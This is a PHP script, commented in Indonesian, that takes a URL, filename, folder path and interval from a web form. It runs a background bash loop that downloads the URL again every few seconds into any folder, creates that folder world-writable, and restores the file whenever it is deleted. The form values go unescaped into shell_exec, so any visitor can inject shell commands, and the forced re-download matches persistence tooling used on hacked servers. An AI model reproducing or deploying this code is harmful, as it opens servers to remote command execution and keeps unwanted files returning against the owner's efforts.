<?php
session_start();

// Fungsi untuk memulai unduhan
function startDownload($url, $filename, $interval, $path) {
    // Pastikan path diakhiri dengan '/'
    $path = rtrim($path, '/') . '/';
    
    // Buat folder jika belum ada
    if (!file_exists($path)) {
        mkdir($path, 0777, true);
    }

    $filePath = $path . $filename;

    // Mulai proses wget secara berulang setiap interval detik
    $cmd = "nohup bash -c 'while true; do wget -O \"$filePath\" \"$url\"; sleep $interval; done' > /dev/null 2>&1 & echo $!";
    $pid = shell_exec($cmd);

    $_SESSION['download_pid'] = trim($pid);
    $_SESSION['download_interval'] = $interval;
    $_SESSION['download_filename'] = $filename;
    $_SESSION['download_path'] = $path;
}

// Fungsi untuk menghentikan unduhan
function stopDownload() {
    if (isset($_SESSION['download_pid'])) {
        $pid = $_SESSION['download_pid'];
        shell_exec("kill $pid");
        unset($_SESSION['download_pid']);
        unset($_SESSION['download_interval']);
        unset($_SESSION['download_filename']);
        unset($_SESSION['download_path']);
    }
}

// Fungsi untuk memulihkan file yang dihapus
function recoverFile($filename) {
    $path = $_SESSION['download_path'] ?? '';
    $filePath = $path . $filename;

    // Jika file terhapus, lakukan unduhan ulang
    if (!file_exists($filePath)) {
        // Misalnya, kita set ulang unduhan dari URL tertentu
        $url = $_SESSION['download_url'] ?? '';
        if ($url) {
            shell_exec("wget -O \"$filePath\" \"$url\" > /dev/null 2>&1 &");
        }
    }
}

// Proses permintaan
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'];

    if ($action === 'start') {
        $url = $_POST['url'];
        $interval = isset($_POST['interval']) ? (int)$_POST['interval'] : 1;
        $filename = $_POST['filename'] ?? 'downloaded_file.ext';
        $path = $_POST['path'] ?? '';

        $_SESSION['download_url'] = $url;
        startDownload($url, $filename, $interval, $path);
    } elseif ($action === 'stop') {
        stopDownload();
    } elseif ($action === 'recover') {
        $filename = $_POST['filename'] ?? 'downloaded_file.ext';
        recoverFile($filename);
    }
}
